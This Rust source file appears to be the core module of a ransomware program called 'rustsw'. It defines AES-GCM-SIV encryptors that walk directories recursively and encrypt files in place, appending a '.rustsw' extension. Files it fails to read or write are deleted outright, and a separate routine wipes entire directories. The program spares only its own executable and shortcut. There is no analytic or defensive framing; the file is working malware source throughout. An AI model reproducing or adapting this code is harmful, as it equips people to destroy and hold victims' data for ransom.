use crate::system_changer::registry_changer;
use aes_gcm_siv::aead::consts::{B0, B1};
use aes_gcm_siv::aead::generic_array::typenum::{UInt, UTerm};
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
use std::fs;
use std::path::Path;
use walkdir::WalkDir;

// Global vars of the extension in case you want to change it, make sure they are both the same like here and the first one starts with a dot.
const ENCRYPTED_EXTENSION: &str = ".rustsw";
const ENCRYPTED_EXTENSION_WITHOUT_DOT: &str = "rustsw";

pub struct Encryptor256bit {
    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
    cipher: Aes256GcmSiv,
    exec_name: String,
}

pub struct Encryptor128bit {
    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
    cipher: Aes128GcmSiv,
    exec_name: String,
}

impl Encryptor256bit {
    pub fn from(key_bytes: [u8; 32], nonce_bytes: [u8; 12]) -> Encryptor256bit {
        let key = Key::from(key_bytes);
        let cipher = Aes256GcmSiv::new(&key);
        let nonce = Nonce::from(nonce_bytes);

        let exec_name = match registry_changer::get_exec_name() {
            Some(name) => name,
            None => String::from(""),
        };

        Encryptor256bit {
            nonce,
            cipher,
            exec_name,
        }
    }

    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn decrypt(&self, encrypted_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.decrypt(&self.nonce, encrypted_text.as_ref()) {
            Ok(decrypted_text) => decrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &String) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                self.attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                self.attempt_delete_file(&path);
            }
        };
    }

    pub fn encrypt_dir(&self, dir: &String) {
        let files = self.get_files_recursively(&dir);

        self.encrypt_files(&files);
    }

    pub fn encrypt_files(&self, files: &Vec<String>) {
        for file in files {
            let path = Path::new(&file);
            match path.extension() {
                Some(ext) => {
                    if ext.to_str() == Some(ENCRYPTED_EXTENSION_WITHOUT_DOT) {
                        continue;
                    }
                }
                None => (),
            }

            match path.file_name() {
                Some(name) => {
                    if name.to_str() == Some(&self.exec_name) {
                        continue;
                    }
                }
                None => (),
            }

            self.encrypt_file_else_delete(&file);

            fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION);
        }
    }

    pub fn delete_files_in_dirs(&self, dirs: &Vec<String>) {
        let lnk_name = (&self.exec_name).clone() + &(&String::from(".lnk")).clone();
        for dir in dirs {
            let files = self.get_files_recursively(&dir);

            for file in files {
                match Path::new(&file).file_name() {
                    Some(name) => {
                        let name = name.to_str();
                        if name == Some(&self.exec_name) || name == Some(&lnk_name) {
                            continue;
                        }
                    }
                    None => (),
                }

                self.attempt_delete_file(&file);
                println!("{}", &file.to_string());
            }
        }
    }

    pub fn attempt_encrypt_files_in_dir(&self, dir: &String) {
        match fs::read_dir(&dir) {
            Ok(dir_read) => {
                let mut files = vec![];
                for entry in dir_read.filter_map(|file| file.ok()) {
                    let path = &entry.path();

                    if path.is_file() {
                        let path_str = match path.to_str() {
                            Some(path_str) => path_str,
                            None => continue,
                        };

                        let path_string = path_str.to_owned();
                        files.push(path_string);
                    }
                }
                self.encrypt_files(&files);
            }
            Err(_) => (),
        }
    }

    fn attempt_delete_file(&self, path: &String) {
        fs::remove_file(path);
    }

    fn get_files_recursively(&self, path: &String) -> Vec<String> {
        let mut files: Vec<String> = vec![];

        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
            if file.metadata().unwrap().is_file() {
                files.push(file.path().display().to_string());
            }
        }

        files
    }
}

impl Encryptor128bit {
    pub fn from(key_bytes: [u8; 16], nonce_bytes: [u8; 12]) -> Encryptor128bit {
        let key = Key::from(key_bytes);
        let cipher = Aes128GcmSiv::new(&key);
        let nonce = Nonce::from(nonce_bytes);

        let exec_name = match registry_changer::get_exec_name() {
            Some(name) => name,
            None => String::from(""),
        };

        Encryptor128bit {
            nonce,
            cipher,
            exec_name,
        }
    }

    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn decrypt(&self, encrypted_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.decrypt(&self.nonce, encrypted_text.as_ref()) {
            Ok(decrypted_text) => decrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &String) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                self.attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                self.attempt_delete_file(&path);
            }
        };
    }

    pub fn encrypt_dir(&self, dir: &String) {
        let files = self.get_files_recursively(&dir);

        self.encrypt_files(&files);
    }

    pub fn encrypt_files(&self, files: &Vec<String>) {
        for file in files {
            let path = Path::new(&file);
            match path.extension() {
                Some(ext) => {
                    if ext.to_str() == Some(ENCRYPTED_EXTENSION_WITHOUT_DOT) {
                        continue;
                    }
                }
                None => (),
            }

            match path.file_name() {
                Some(name) => {
                    if name.to_str() == Some(&self.exec_name) {
                        continue;
                    }
                }
                None => (),
            }

            self.encrypt_file_else_delete(&file);

            fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION);
        }
    }

    pub fn delete_files_in_dirs(&self, dirs: &Vec<String>) {
        let lnk_name = (&self.exec_name).clone() + &(&String::from(".lnk")).clone();
        for dir in dirs {
            let files = self.get_files_recursively(&dir);

            for file in files {
                match Path::new(&file).file_name() {
                    Some(name) => {
                        let name = name.to_str();
                        if name == Some(&self.exec_name) || name == Some(&lnk_name) {
                            continue;
                        }
                    }
                    None => (),
                }

                self.attempt_delete_file(&file);
                println!("{}", &file.to_string());
            }
        }
    }

    pub fn attempt_encrypt_files_in_dir(&self, dir: &String) {
        match fs::read_dir(&dir) {
            Ok(dir_read) => {
                let mut files = vec![];
                for entry in dir_read.filter_map(|file| file.ok()) {
                    let path = &entry.path();

                    if path.is_file() {
                        let path_str = match path.to_str() {
                            Some(path_str) => path_str,
                            None => continue,
                        };

                        let path_string = path_str.to_owned();
                        files.push(path_string);
                    }
                }
                self.encrypt_files(&files);
            }
            Err(_) => (),
        }
    }

    fn attempt_delete_file(&self, path: &String) {
        fs::remove_file(path);
    }

    fn get_files_recursively(&self, path: &String) -> Vec<String> {
        let mut files: Vec<String> = vec![];

        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
            if file.metadata().unwrap().is_file() {
                files.push(file.path().display().to_string());
            }
        }

        files
    }
}
